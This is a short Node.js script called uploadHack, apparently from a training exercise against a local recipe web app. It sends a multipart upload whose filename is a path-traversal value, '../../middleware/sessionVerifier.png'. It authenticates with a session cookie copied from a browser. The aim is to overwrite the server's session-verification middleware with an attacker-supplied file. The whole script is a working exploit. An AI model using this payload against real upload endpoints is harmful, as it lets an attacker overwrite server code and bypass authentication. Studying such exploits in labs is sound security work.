import axios from 'axios';
import FormData from 'form-data';
import fs from 'fs';
import getLocalIp from '../../getLocalIp.js'

const PORT = 5173;
const localIp = getLocalIp();
const sessionIdCopiedFromBrowser = "b7c44bb1-9851-4f01-83c1-6855adacd0ce";

async function uploadHack() {
    const url = `http://${localIp}:${PORT}/api/addRecipe`;
    const boundary = "----------------------------068545562005799140548789";
    const filePath = "../../middleware/sessionVerifier.png"; // Adjust the file path as necessary
    const realFilePath = "../../spoilers/Poop_Emoji.png"; // Adjust the file path as necessary

    const formData = new FormData();
    formData.append("image", fs.createReadStream(realFilePath), {
        filename: filePath, //encodeURIComponent(filePath),
        contentType: "image/png"
    });
    formData.append("instructions", "test");
    formData.append("name", "test");

    try {
        const response = await axios.post(url, formData, {
            headers: {
                ...formData.getHeaders(),
                "Content-Type": `multipart/form-data; boundary=${boundary}`,
                "Cookie": `sessionId=${sessionIdCopiedFromBrowser}`
            }
        });

        if (response.status < 300) {
            console.log("Success:", response.data);
        } else {
            console.log("Failed:", response.status);
        }
    } catch (error) {
        console.error("Error:", error.message);
    }
}

uploadHack();
